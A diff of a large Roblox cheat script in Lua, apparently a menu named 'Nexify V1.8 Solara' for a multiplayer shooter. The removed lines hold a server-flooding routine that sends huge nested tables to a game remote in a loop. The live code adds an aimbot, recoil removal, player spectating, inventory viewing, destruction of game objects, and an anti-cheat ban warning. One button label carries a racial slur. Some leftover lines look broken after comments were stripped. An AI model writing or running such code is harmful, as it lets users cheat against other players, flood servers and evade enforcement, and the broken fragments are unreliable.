-            end
-            local calculateperfectval = (mainvalueifonetable/(val+2))
-            return calculateperfectval
-        end
-        local function bomb(tableincrease, tries)
-            local maintable = {}
-            local spammedtable = {}
 
-            table.insert(spammedtable, {})
-            z = spammedtable[1]
 
-            for i = 1, tableincrease do
-                local tableins = {}
-                table.insert(z, tableins)
-                z = tableins
-            end
-
-            local calculatemax = getmaxvalue(tableincrease)
-            local maximum
-
-            if calculatemax then
-                maximum = calculatemax
-            else
-                maximum = 1999999
-            end
-
-            for i = 1, maximum do
-                table.insert(maintable, spammedtable)
-            end
-
-            for i = 1, tries do
-                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-            end
-        end
-        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-        bomb(Options["FUCKPDD!!!!"].Value, Options["FUCKPDD!!!!!!!!"].Value)
-    end
-    while true do
-        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-        if Options["FUCKPDDDD"].Value then rahhh() end
-        wait(Options["FUCKPDD!!!!!!!!"].Value)
-    end
-end)]]
 
 aimtab:AddLabel("Nexify V1.8 Solara", true)
 
@@ -3451,9 +3301,9 @@ aimtab:AddToggle('nograss', {
     end
 })
 
--- Ensure that `players` is defined correctly and `skins` is accessible.
 
-local LC = Game.Players.LocalPlayer  -- Correctly define `LC` as the LocalPlayer
+
+local LC = Game.Players.LocalPlayer  
 local rp = game:GetService("ReplicatedStorage")
 local skins = {
 	["762x25MAG"] = "Nutcracker",
@@ -3499,7 +3349,7 @@ local skins = {
 	MP443 = "Whiteout",
 	IZh81 = "Watergun",
 }
-  -- Ensure `skins` is defined, e.g., skins = { ["ItemName"] = "SkinId" }
+  
 
 
 
@@ -3573,7 +3423,7 @@ aimtab:AddDropdown('DV2SKin', {
 
 
 
--- Ensure the localPlayer variable is valid
+
 local localPlayer = game.Players.LocalPlayer
 if not localPlayer then
     warn("LocalPlayer is not available!")
@@ -3587,17 +3437,17 @@ if DV2 and Karambit then
     Karambit.Name = "DV2"
 end
 
--- Ensure skins table is defined and not nil
-local skins = skins or {}  -- You should define the skins table elsewhere, or use this to prevent errors
 
--- Check if the "Players" and "localPlayer" objects exist in ReplicatedStorage
+local skins = skins or {}  
+
+
 if game.ReplicatedStorage:FindFirstChild("Players") and game.ReplicatedStorage.Players:FindFirstChild(localPlayer.Name) then
     local plr = game.ReplicatedStorage.Players:FindFirstChild(localPlayer.Name)
-    -- Ensure plr exists before proceeding
+    
     if plr then
-        -- Loop through the descendants of the player
+        
         for i, v in pairs(plr:GetDescendants()) do
-            -- Ensure the item has ItemProperties and that the skin exists
+            
             if v:FindFirstChild("ItemProperties") and skins[v.Name] then
                 v.ItemProperties:SetAttribute("Skin", skins[v.Name])
             end
@@ -3633,13 +3483,13 @@ game.ReplicatedStorage.VFX:Destroy()
 local Workspace = game:GetService("Workspace")
 
 
--- Global variables
-local speedMultiplier = 1 -- Default speed multiplier
+
+local speedMultiplier = 1 
 local viewModel = nil
 local animator = nil
-local monitoring = true -- To control the loop
+local monitoring = true 
 
--- Function to change the speed of all currently playing animations
+
 local function changeAnimationSpeed(multiplier)
     if animator then
         for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do
@@ -3648,7 +3498,7 @@ local function changeAnimationSpeed(multiplier)
     end
 end
 
--- Function to set up the Animator
+
 local function setupAnimator()
     viewModel = Workspace:FindFirstChild("Camera") and Workspace.Camera:FindFirstChild("ViewModel")
     if viewModel then
@@ -3656,10 +3506,10 @@ local function setupAnimator()
         if humanoid then
             animator = humanoid:FindFirstChildOfClass("Animator")
             if animator then
-                -- Apply speed to currently playing animations
+                
                 changeAnimationSpeed(speedMultiplier)
                 
-                -- Adjust speed for any new animations that start playing
+                
                 animator.AnimationPlayed:Connect(function(animTrack)
                     animTrack:AdjustSpeed(speedMultiplier)
                 end)
@@ -3677,7 +3527,7 @@ local function setupAnimator()
     return false
 end
 
--- Function to continuously check for ViewModel and update Animator
+
 local function monitorViewModel()
     while monitoring do
         local hasViewModel = setupAnimator()
@@ -3687,33 +3537,33 @@ local function monitorViewModel()
             viewModel = nil
         end
 
-        wait(0.1) -- Check every second, adjust as needed
+        wait(0.1) 
     end
 end
 
--- Function to toggle animation speed adjustment
+
 local function toggleAnimationSpeed(enable)
     if enable and animator then
-        -- Apply the speed multiplier to currently playing animations
+        
         changeAnimationSpeed(speedMultiplier)
     else
-        -- Optional: You might want to reset speed or handle disabling here if needed
+        
         print("Animation speed adjustment disabled.")
     end
 end
 
--- Slider or value control for speedMultiplier
+
 local function setSpeedMultiplier(value)
     speedMultiplier = value
-    toggleAnimationSpeed(true) -- Reapply speed with new multiplier
+    toggleAnimationSpeed(true) 
 end
 
-local Lighting = game:GetService("Lighting") -- Ensure Lighting service is referenced
-local fullBrightActive = false -- Track toggle state
-local oldSettings = {} -- Table to store old lighting settings
+local Lighting = game:GetService("Lighting") 
+local fullBrightActive = false 
+local oldSettings = {} 
 
 local function enableFullBright()
-    -- Store old settings if not already stored
+    
     if not oldSettings.Ambient then
         oldSettings.Ambient = Lighting.Ambient
         oldSettings.Brightness = Lighting.Brightness
@@ -3721,31 +3571,31 @@ local function enableFullBright()
         oldSettings.GlobalShadows = Lighting.GlobalShadows
     end
 
-    -- Set full bright settings
+    
     Lighting.Ambient = Color3.fromRGB(255, 255, 255)
-    Lighting.Brightness = 2 -- Increased brightness
-    Lighting.GlobalShadows = false -- Disable shadows
-    Lighting.ShadowSoftness = 0 -- Disable shadow softness for a flat lighting effect
+    Lighting.Brightness = 2 
+    Lighting.GlobalShadows = false 
+    Lighting.ShadowSoftness = 0 
 end
 
 local function disableFullBright()
-    -- Restore old settings
+    
     Lighting.Ambient = oldSettings.Ambient or Lighting.Ambient
     Lighting.Brightness = oldSettings.Brightness or Lighting.Brightness
     Lighting.GlobalShadows = oldSettings.GlobalShadows ~= nil and oldSettings.GlobalShadows or Lighting.GlobalShadows
     Lighting.ShadowSoftness = oldSettings.ShadowSoftness or Lighting.ShadowSoftness
 end
 
--- Toggle to enable/disable full bright
+
 Misc:AddToggle('fullBrightToggle', {
     Text = 'Enable Full Bright',
     Default = false,
     Callback = function(state)
         fullBrightActive = state
         if fullBrightActive then
-            enableFullBright() -- Enable full bright
+            enableFullBright() 
         else
-            disableFullBright() -- Disable full bright
+            disableFullBright() 
         end
     end
 })
@@ -3757,7 +3607,7 @@ movetab:AddToggle('noglobshadow', {
     Callback = function(state)
         noglobshadowactive = state
         if noglobshadowactive then
-            game.Lighting.GlobalShadows = false -- Enable full bright
+            game.Lighting.GlobalShadows = false 
         else
             game.Lighting.GlobalShadows = true
         end
@@ -3767,14 +3617,14 @@ movetab:AddToggle('noglobshadow', {
 aimtab:AddToggle('nowaterblur', {
     Text = 'No Water Blur',
     Tooltip = 'No Blur For Water',
-    Default = false, -- Initialize with the current state
+    Default = false, 
     Callback = function(enabled)
         if enabled then
         library:Notify("Enabled No Water Blur", 10)
-            game.Lighting.WaterBlur.Size = 0 -- If toggle is enabled, set blur to 0
+            game.Lighting.WaterBlur.Size = 0 
         else
         library:Notify("Disabled No Water Blur", 10)
-            game.Lighting.WaterBlur.Size = 24 -- If toggle is disabled, set blur to default (24)
+            game.Lighting.WaterBlur.Size = 24 
         end
     end
 })
@@ -3789,21 +3639,21 @@ movetab:AddDropdown('FunctionMode', {
     Text = 'Function Mode ⚠️',
     Tooltip = 'Function Mode ⚠️ (NOT RECOMMENDED TO CHANGE)',
     Callback = function(state)
-                -- Reduce FPS cap for 0.6 seconds
-        setfpscap(0)  -- Lower FPS cap drastically (example: 10 FPS)
+                
+        setfpscap(0)  
 
-        -- Wait for 0.6 seconds
+        
         wait(1.9)
 
-        -- Reset the FPS cap to its default or original state
-        setfpscap(9000)  -- Reset FPS cap (you can set it to your default FPS cap, e.g., 60 FPS)
+        
+        setfpscap(9000)  
     end
 })
 
 aimtab:AddToggle('removevisors', {
     Text = 'Remove Visors',
     Default = false,
-    Callback = function(state)  -- Renamed 'first' to 'state' for clarity
+    Callback = function(state)  
         if state then
             game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visible = false
         else
@@ -3814,7 +3664,7 @@ aimtab:AddToggle('removevisors', {
 
 
 
--- Adding Toggle to aimtab
+
 aimtab:AddToggle('Instantequip', {
     Text = 'Instant Equip',
     Tooltip = 'Instant Equip',
@@ -3822,16 +3672,16 @@ aimtab:AddToggle('Instantequip', {
     
     Callback = function(isToggled)
         if isToggled then
-            -- Enable instant reload and set high speed
+            
             setSpeedMultiplier(7)
         else
-            -- Disable instant reload and reset to normal speed
+            
             setSpeedMultiplier(1)
         end
     end
 })
 
--- Start monitoring the ViewModel in a coroutine to avoid blocking the main thread
+
 coroutine.wrap(monitorViewModel)()
 
 local function nostalgiaModePd(enabled)
@@ -3873,33 +3723,33 @@ end
  mouse = player:GetMouse()
  ReplicatedStorage = game:GetService("ReplicatedStorage")
  RunService = game:GetService("RunService")
-UserInputService = game:GetService("UserInputService")  -- Corrected this line
+UserInputService = game:GetService("UserInputService")  
 
--- Create a simple GUI to display inventory
+
 screenGui = Instance.new("ScreenGui")
 screenGui.Parent = player.PlayerGui
 
  frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 200, 0, 300)  -- Adjust the size of the frame
-frame.Position = UDim2.new(0, 45, 0, 10)  -- Position the frame in the corner of the screen
+frame.Size = UDim2.new(0, 200, 0, 300)  
+frame.Position = UDim2.new(0, 45, 0, 10)  
 frame.BackgroundTransparency = 1
-frame.Visible = false  -- Make it visible initially
+frame.Visible = false  
 frame.Parent = screenGui
 
  textLabel = Instance.new("TextLabel")
 textLabel.Size = UDim2.new(1, 0, 1, 0)
 textLabel.Position = UDim2.new(0, 0, 0, 0)
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text
-textLabel.TextSize = 14  -- Smaller text size
-textLabel.Font = Enum.Font.Code  -- Set font to "Code" (Font ID 2)
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  
+textLabel.TextSize = 14  
+textLabel.Font = Enum.Font.Code  
 textLabel.BackgroundTransparency = 1
 textLabel.Text = "=== Inventory Viewer ==="
 textLabel.Parent = frame
 
--- Variable to toggle the display on/off
+
  isInventoryViewerActive = false
 
--- Function to get closest player to the mouse position
+
 function getClosestPlayer()
     local closestPlayer = nil
     local shortestDistance = math.huge
@@ -3917,7 +3767,7 @@ function getClosestPlayer()
     return closestPlayer
 end
 
--- Function to update inventory and clothing display
+
 function updateInventoryDisplay(playerName)
     local closestPlayer = game.Players:FindFirstChild(playerName)
     if closestPlayer and closestPlayer.Character then
@@ -3928,7 +3778,7 @@ function updateInventoryDisplay(playerName)
             local inventoryText = "=== Inventory Viewer ===\n" .. closestPlayer.Name .. "'s Inventory\n\n"
             local itemsFound = false
 
-            -- Check if there are any items in the inventory
+            
             if inventory then
                 inventoryText = inventoryText .. "Inventory:\n"
                 for _, itemName in pairs(inventory:GetChildren()) do
@@ -3939,7 +3789,7 @@ function updateInventoryDisplay(playerName)
                 end
             end
 
-            -- Check if there are any clothing items
+            
             if clothing then
                 inventoryText = inventoryText .. "\nClothing:\n\n"
                 for _, clothingItem in pairs(clothing:GetChildren()) do
@@ -3950,7 +3800,7 @@ function updateInventoryDisplay(playerName)
                 end
             end
 
-            -- If no items are found in either inventory or clothing, display "Empty"
+            
             if not itemsFound then
                 inventoryText = inventoryText .. "Empty"
             end
@@ -3964,23 +3814,23 @@ function updateInventoryDisplay(playerName)
     end
 end
 
--- Toggle function to turn the inventory viewer on or off
+
 function toggleInventoryViewer()
     isInventoryViewerActive = not isInventoryViewerActive
-    frame.Visible = isInventoryViewerActive  -- Show/hide the frame based on the toggle
+    frame.Visible = isInventoryViewerActive  
 end
 
 
 
--- Use RunService.Heartbeat to update continuously when active
+
 RunService.Heartbeat:Connect(function()
     if isInventoryViewerActive then
         local closestPlayer = getClosestPlayer()
         if closestPlayer then
-            -- If a player is found, update the inventory display
+            
             updateInventoryDisplay(closestPlayer.Name)
         else
-            -- If no player is found, hide the GUI
+            
             textLabel.Text = "No player found."
         end
     end
@@ -3989,23 +3839,23 @@ end)
 
 
 
--- Example usage
-local directory = game.ReplicatedStorage.Clans -- or any other parent instance
+
+local directory = game.ReplicatedStorage.Clans 
 
 movetab:AddButton('Nigga Whisper', function()
 
-    -- Destroy clothing items
+    
     game.ReplicatedStorage.AiPresets.WhisperAI.Pants:Destroy()
     game.ReplicatedStorage.AiPresets.WhisperAI.Shirt:Destroy()
     
-    -- Retrieve the BodyColors instance
+    
     local bodyColors = game.ReplicatedStorage.AiPresets.WhisperAI["Body Colors"]
     
-    -- Function to change body colors to dark
+    
     local function setDarkColors()
-        -- Check if BodyColors instance exists
+        
         if bodyColors and bodyColors:IsA("BodyColors") then
-            -- Set all color properties to dark color
+            
             bodyColors.HeadColor = BrickColor.new("Black")
             bodyColors.LeftArmColor = BrickColor.new("Black")
             bodyColors.LeftLegColor = BrickColor.new("Black")
@@ -4017,7 +3867,7 @@ movetab:AddButton('Nigga Whisper', function()
         end
     end
     
-    -- Apply the dark colors
+    
     setDarkColors()
 
 end)
@@ -4053,7 +3903,7 @@ movetab:AddButton('Destroy Buildables', function()
 game.ReplicatedStorage.Buildable:Destroy()
 
  end)
---[[
+
 aimtab:AddToggle('Aimbot', {
     Text = 'Aim Bot',
     Tooltip = 'Locks To Head Or Torso',
@@ -4078,7 +3928,7 @@ aimtab:AddToggle('Aimbot', {
     end,
 })
 
---]]
+
 local HitmarkerSounds = {
     ["TF2"]       = "rbxassetid://8255306220",
     ["Gamesense"] = "rbxassetid://4817809188",
@@ -4093,28 +3943,28 @@ local HitmarkerSounds = {
     ["Osu!"]      = "rbxassetid://7151989073",
 }
 
--- Create the dropdown for selecting hit sounds
+
 aimtab:AddDropdown('cameradropdown', {
-    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  -- Add all the options
-    Default = 3,  -- Default selection is 'Rust'
+    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  
+    Default = 3,  
     Multi = false,
     Text = 'Hit Sounds', 
     Tooltip = 'Hit Sounds', 
     Callback = function(state)
-        -- Get the selected sound ID from the HitmarkerSounds table
+        
         local globalhitsounds = HitmarkerSounds[state]
         
-        -- Ensure the sound ID is valid and exists
+        
         if globalhitsounds then
             local SFXDIRECTORY = game.ReplicatedStorage.SFX
 
-            -- Assign the selected sound ID to all relevant sounds
+            
             SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.SoundId = globalhitsounds
             SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.SoundId = globalhitsounds
             SFXDIRECTORY.Hits.HitMarkers.Helmet.SoundId = globalhitsounds
             SFXDIRECTORY.Hits.HitMarkers.Bodyshot.SoundId = globalhitsounds
             SFXDIRECTORY.Hits.HitMarkers.Headshot.SoundId = globalhitsounds
-				--vol--um
+				
 	    SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.Volume = 10
             SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.Volume = 10
             SFXDIRECTORY.Hits.HitMarkers.Helmet.Volume = 10
@@ -4130,12 +3980,12 @@ aimtab:AddButton('No Gun Weight', function()
 
 local playerName = game.Players.LocalPlayer.Name
 
--- Access the player's inventory based on their actual name
+
 local playerInventory = game.ReplicatedStorage.Players[playerName].Inventory
 
 
 
--- Loop through all items in the inventory and set the "MovementModifier" attribute
+
 for _, item in pairs(playerInventory:GetChildren()) do
     if item:FindFirstChild("ItemProperties") and item.ItemProperties:FindFirstChild("Tool") then
         item.ItemProperties.Tool:SetAttribute("MovementModifer", "0")
@@ -4268,7 +4118,7 @@ movetab:AddDropdown('cameradropdown', {
     Text = 'Camera Type',
     Tooltip = 'Camera Type',
     Callback = function(state)
-        game.workspace.Camera.CameraType = state -- Update the target part based on dropdown selection
+        game.workspace.Camera.CameraType = state 
     end
 })
 
@@ -4279,7 +4129,7 @@ aimtab:AddDropdown('aimbottargetpart', {
     Text = 'Aimbot Target Part',
     Tooltip = 'Select a part for targeting (Aimbot)',
     Callback = function(Value)
-        targetPart = Value -- Update the target part based on dropdown selection
+        targetPart = Value 
     end
 })
 
@@ -4292,33 +4142,33 @@ for i,v in pairs(ammo:GetChildren()) do
 end
 
 end
---[[
+
 aimtab:AddToggle('InstantHit', {
     Text = 'Instant Hit',
     Tooltip = 'Instant Hit',
     Default = false,
 
     Callback = function(enabled)
-        -- Locate the AmmoTypes folder in ReplicatedStorage
+        
         local ammo = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
         if ammo then
-            -- Iterate through all children of AmmoTypes
+            
             for _, v in pairs(ammo:GetChildren()) do
-                -- If the toggle is enabled, set MuzzleVelocity to 3200, else revert it to default (you might need to set the correct default value)
+                
                 if enabled then
                     v:SetAttribute("MuzzleVelocity", 3200)
                 else
-                    v:SetAttribute("MuzzleVelocity", 3100) -- Replace 1500 with the default value you want
+                    v:SetAttribute("MuzzleVelocity", 3100) 
                 end
             end
         end
     end
 })
 
---]]
 
 
--- Create the recoil slider and handle its change event
+
+
 aimtab:AddSlider('RecoilStrength', {
     Text = 'Recoil Slider',
     Default = 230,
@@ -4327,42 +4177,42 @@ aimtab:AddSlider('RecoilStrength', {
     Rounding = 0,
     Compact = false,
 }):OnChanged(function(State)
-    -- Check if the slider value is zero
+    
     if State == 0 then
-        -- Set the recoil strength to "0" for all children of ammo
+        
         for i, v in pairs(ammo:GetChildren()) do
             v:SetAttribute("RecoilStrength", "0")
         end
     else
-        -- Set the recoil strength to the slider value for all children of ammo
+        
         for i, v in pairs(ammo:GetChildren()) do
             v:SetAttribute("RecoilStrength", State)
         end
     end
 end)
 
--- Load Services
+
  Players = game:GetService("Players")
  RunService = game:GetService("RunService")
  UserInputService = game:GetService("UserInputService")
  Workspace = game:GetService("Workspace")
 
--- Variables
+
  watchingPlayerName = "nobody"
  isWatching = false
  watchConnection = nil
  draggableCamera = false
 
--- Function to populate player names
+
  function getPlayerNames()
-    local names = {"nobody"} -- Add "nobody" as the default option
+    local names = {"nobody"} 
     for _, player in ipairs(Players:GetPlayers()) do
         table.insert(names, player.Name)
     end
     return names
 end
 
--- Function to start watching a player
+
  function startWatching(playerName)
     if playerName == "nobody" then
         return
@@ -4391,7 +4241,7 @@ end
     end)
 end
 
--- Function to stop watching
+
  function stopWatching()
     if isWatching then
         isWatching = false
@@ -4400,18 +4250,18 @@ end
             watchConnection:Disconnect()
             watchConnection = nil
         end
-        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom -- Reset camera
+        Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom 
     end
 end
 
--- Function to refresh dropdown values
+
  function refreshDropdown(dropdown)
     dropdown:Update({
         Values = getPlayerNames(),
     })
 end
 
--- Add the dropdown
+
 movetab:AddDropdown('Player Watcher', {
     Values = getPlayerNames(),
     Default = 1,
@@ -4420,20 +4270,20 @@ movetab:AddDropdown('Player Watcher', {
     Tooltip = 'Press B to Unwatch',
     Callback = function(state)
         watchingPlayerName = state
-        stopWatching() -- Stop any ongoing watch
+        stopWatching() 
         if state ~= "nobody" then
             startWatching(state)
         end
     end
 })
 
--- Key Detection for Stopping and Draggable Mode
+
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then
         return
     end
 
-    -- Toggle draggable camera mode with mouse button
+    
     if isWatching and (input.UserInputType == Enum.UserInputType.MouseButton2) then
         draggableCamera = true
         Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
@@ -4447,14 +4297,14 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
         return
     end
 
-    -- Disable draggable camera mode when mouse button is released
+    
     if isWatching and (input.UserInputType == Enum.UserInputType.MouseButton2) then
         draggableCamera = false
         Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
     end
 end)
 
--- Refresh dropdown whenever a player joins or leaves
+
 Players.PlayerAdded:Connect(function()
     refreshDropdown(movetab.Dropdown.PlayerWatcher)
 end)
@@ -4468,14 +4318,14 @@ local function predict_drop(part, entity, projectile_speed, projectile_drop)
     local distance = (trident.middlepart.Position - part.Position).Magnitude
     local time_to_hit = distance / projectile_speed
 
-    -- Simpler final projectile speed assumption
-    local final_projectile_speed = projectile_speed  -- Assuming constant speed
+    
+    local final_projectile_speed = projectile_speed  
 
-    -- Simplified drop calculation
+    
     local drop_timing = projectile_drop * time_to_hit
 
-    -- Return drop_timing or 0 if it's not a valid number
-    if drop_timing ~= drop_timing then  -- Check for NaN
+    
+    if drop_timing ~= drop_timing then  
         return 0
     end
 
@@ -4492,7 +4342,7 @@ end)
 
 aimtab:AddLabel("Default Is 0.118", true)
 
--- Slider setup
+
 aimtab:AddSlider('Predictionslider', {
     Text = 'Prediction Slider',
     Default = 0.118,
@@ -4511,25 +4361,25 @@ end)
 
 
 
--- Get all available materials in Roblox
+
 local materials = {}
 for _, material in ipairs(Enum.Material:GetEnumItems()) do
     table.insert(materials, material.Name)
 end
 
--- Create a function for ban detection
+
 local function detectBan()
     while true do
-        wait(3) -- Wait 4 seconds before the next check
+        wait(3) 
 
-        -- Check if the UAC and BeingBanned attribute exist
+        
         local playerStatus = game.ReplicatedStorage.Players:FindFirstChild(Game.Players.LocalPlayer.Name)
         
         if playerStatus and playerStatus:FindFirstChild("Status") and playerStatus.Status:FindFirstChild("UAC") then
-            -- Check if the 'BeingBanned' attribute exists
+            
             local beingBanned = playerStatus.Status.UAC:GetAttribute("BeingBanned")
             
-            -- If BeingBanned is true, print a message
+            
             if beingBanned == true then
                 print("You are being banned!")
                 library:Notify("[UAC] YOU ARE GOING TO GET BANNED.", 25)
@@ -4541,17 +4391,18 @@ local function detectBan()
     end
 end
 
--- Start the ban detection coroutine
+
 coroutine.wrap(detectBan)()
+wait(4)
 library:Notify("[UAC] BAN DETECTOR STARTED!")
 
--- Define the material mapping (for quick lookup)
+
 local materialMapping = {}
 for _, material in ipairs(Enum.Material:GetEnumItems()) do
     materialMapping[material.Name] = material
 end
 
--- Dropdown setup with all materials
+
 aimtab:AddDropdown('dv2materialchanger', {
     Values = materials,
     Default = 1,
@@ -4559,20 +4410,20 @@ aimtab:AddDropdown('dv2materialchanger', {
     Text = 'DV2 Material Changer',
     Tooltip = 'Changes The Material Of The DV2',
     Callback = function(selectedValue)
-        -- Get the material type based on the dropdown selection
+        
         local materialType = materialMapping[selectedValue]
         
-        -- Ensure the material type exists in the mapping
+        
         if materialType then
-            -- Get the item from the specified path
+            
             local item = game.Workspace:FindFirstChild('Camera')
                                     :FindFirstChild('ViewModel')
                                     :FindFirstChild('Item')
                                     :FindFirstChild('ItemRoot')
 
-            -- Check if the item was found
+            
             if item then
-                -- Apply the selected material to the item
+                
                 item.Material = materialType
                 item.SurfaceAppearance:Destroy()
             else
@@ -4585,34 +4436,34 @@ aimtab:AddDropdown('dv2materialchanger', {
 })
 
 
---aimtab:AddToggle('hitboxexpander', {
---    Text = 'Bigger Heads',
---    Tooltip = 'Bigger Heads',
---    Default = false,
---
---    Callback = function(first)
---       toggleHeadEffect()
---    end
---})
 
 
 
 
 
 
--- Adding the slider to adjust FOV
+
+
+
+
+
+
+
+
+
+
 aimtab:AddSlider('fovslider', {
     Text = 'FOV Slider',
     Default = 90,
-    Min = 0, -- Minimum FOV value
+    Min = 0, 
     Max = 120,
     Rounding = 2,
     Compact = false,
 }):OnChanged(function(State)
-    -- Check if the camera is available
+    
     if camera then
         
-        camera.FieldOfView = State -- Update the FOV of the camera
+        camera.FieldOfView = State 
 
     else
         warn("Camera not found!")
@@ -4623,29 +4474,11 @@ end)
 
 
 
--- Add the Head Size Slider
-aimtab:AddSlider('HeadSizeSlider', {
-    Text = 'Head Size Slider',
-    Default = 3.5,
-    Min = 1, -- Minimum normal head size
-    Max = 4,
-    Rounding = 3,
-    Compact = false,
-}):OnChanged(function(State)
-    headSizeMultiplier = State -- Update the head size multiplier when the slider changes
-    
-    -- Apply the effect to all players if it is enabled
-    if isEnabled then
-        for _, player in pairs(players:GetPlayers()) do
-            applyHeadEffect(player)
-        end
-    end
-end)
 
--- Function to check if a target is visible (line-of-sight)
--- Function to check if a target is visible (line-of-sight)
--- Function to simulate holding the left mouse button
--- Function to check if the target is a valid player (or another specific type of target)
+
+
+
+
 local function isValidTarget(target)
     if target and target:IsA("BasePart") then
         local character = target.Parent
@@ -4655,60 +4488,60 @@ local function isValidTarget(target)
     return false
 end
 
----- Function to simulate holding the left mouse button
---local function startAutoFire()
---    while autoFireEnabled do
---        local target = mouse.Target
+
+
+
+
         
- --       if isValidTarget(target) then
-            virtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0) -- Hold down left mouse button
- --       else
-            virtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0) -- Release left mouse button if no valid target
- --       end
+ 
+            virtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0) 
+ 
+            virtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0) 
+ 
         
- --       wait(0.1) -- Adjust the delay as needed
-  --  end
+ 
+  
     
-    -- Ensure the left mouse button is released when auto-fire is disabled
---    virtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0)
---end
-
--- Function to toggle auto-firing
---local function toggleAutoFire()
---    autoFireEnabled = not autoFireEnabled
     
---    if autoFireEnabled then
---        print("Auto-fire enabled")
-        -- Start auto-firing in a coroutine
---        coroutine.wrap(startAutoFire)()
---    else
- --       print("Auto-fire disabled")
---    end
---end
 
 
---aimtab:AddToggle('atgyatshoot', {
---    Text = 'Auto Shoot',
- --   Tooltip = 'Auto Shoots Until That Player You Aim Dies.',
---    Default = false,
 
---    Callback = function(first)
---        toggleAutoFire()
---    end
---}):AddKeyPicker('autoshotkeybind', {
---    Default = 'None',
---    SyncToggleState = true,
 
---    Mode = 'Toggle',
 
---    Text = 'AutoShootKeyBind',
-----    NoUI = false,
---
---    Callback = function(Value)
----    end,
---})
 
---[[
+    
+
+
+        
+
+
+ 
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -4724,23 +4557,23 @@ aimtab:AddToggle('predictiontoggle13', {
                 togglePrediction()
     end
 })
-]]--
 
 
--- Aim FOV Slider to adjust prediction value
---aimtab:AddSlider('Prediction', {
- --   Text = 'Prediction Slider',
- --   Default = predictionFactor, -- Default value set here
- --   Min = 0.1,
- --   Max = 1,
-  --  Rounding = 2, -- You can set the rounding to 2 decimal places for more precise control
- --   Compact = false,
---}):OnChanged(function(state)
- --   predictionFactor = state -- Update the predictionFactor based on slider value
---    print("Prediction Factor updated to:", predictionFactor)
---zend)
 
-local isEnabled883 = false  -- Global variable to track whether the script is enabled or disabled
+
+
+ 
+ 
+ 
+ 
+  
+ 
+
+ 
+
+
+
+local isEnabled883 = false  
 local LC = game.Players.LocalPlayer
 
 local function toggleBunnyHop()
@@ -4766,13 +4599,13 @@ aimtab:AddToggle('Bunnyhop', {
 })
 
 
--- Define the function to update sound IDs
+
 local function updateSoundIds()
-    -- Fetching the sound objects
+    
     local hitMarkers = game.ReplicatedStorage:WaitForChild("SFX"):WaitForChild("Hits"):WaitForChild("HitMarkers")
     local hitMarkers2 = game.ReplicatedStorage:WaitForChild("SFX"):WaitForChild("Hits"):WaitForChild("ProjectileHits")
     
-    -- Defining the sounds dictionary with their corresponding instances
+    
     local sounds = {
         Helmet = hitMarkers:FindFirstChild("Helmet"),
         BodyArmor = hitMarkers:FindFirstChild("BodyArmor"),
@@ -4781,7 +4614,7 @@ local function updateSoundIds()
         Headshot = hitMarkers:FindFirstChild("Headshot")
     }
 
-    -- Loop through each sound and update its SoundId
+    
     for name, sound in pairs(sounds) do
         if sound then
             sound.SoundId = "rbxassetid://5043539486"
@@ -4794,14 +4627,14 @@ end
 
 
 
--- Adding a button to change the hit sounds
+
 
 
 local isCheckingVisibility = false
 local textLabel = nil
 local connection = nil
 
--- Function to create the visibility text label
+
 local function createVisibilityText()
     if not textLabel then
         local screenGui = Instance.new("ScreenGui")
@@ -4812,14 +4645,14 @@ local function createVisibilityText()
         textLabel.Text = ""
         textLabel.TextColor3 = Color3.new(0, 1, 0)
         textLabel.BackgroundTransparency = 1
-        textLabel.Position = UDim2.new(0.5, 0, 0.9, 0) -- Positioning slightly down the middle
+        textLabel.Position = UDim2.new(0.5, 0, 0.9, 0) 
         textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
         textLabel.Font = Enum.Font.SourceSansBold
-        textLabel.TextSize = 24 -- Medium-sized text
+        textLabel.TextSize = 24 
     end
 end
 
--- Function to check if the player is visible
+
 local function isPlayerVisible(target)
     if target and target.Parent:FindFirstChild("HumanoidRootPart") then
         local camera = workspace.CurrentCamera
@@ -4834,7 +4667,7 @@ local function isPlayerVisible(target)
     return false
 end
 
--- Function to toggle visibility checking
+
 local function toggleVisibilityCheck()
     isCheckingVisibility = not isCheckingVisibility
 
@@ -4860,31 +4693,31 @@ local function toggleVisibilityCheck()
     end
 end
 
--- Example usage: toggle visibility checking on/off
---toggleVisibilityCheck() -- Call this to enable or disable the function
 
 
---aimtab:AddToggle('faketoggle1', {
-  --  Text = 'Better Aimbot',
-  --  Tooltip = 'Better Aimbot',
- --   Default = false,
 
-  --  Callback = function(first)
+
+
+  
+  
+ 
+
+  
         
- --   end
---})
+ 
 
---aimtab:AddToggle('automatic131', {
---    Text = 'Automatic Prediction Adjust',
---    Tooltip = 'Automatic Prediction Adjust',
---    Default = false,
---
---    Callback = function(first)
---       toggleAdjustPrediction()
---    end
---})
 
---toggleSwimmingState()
+
+
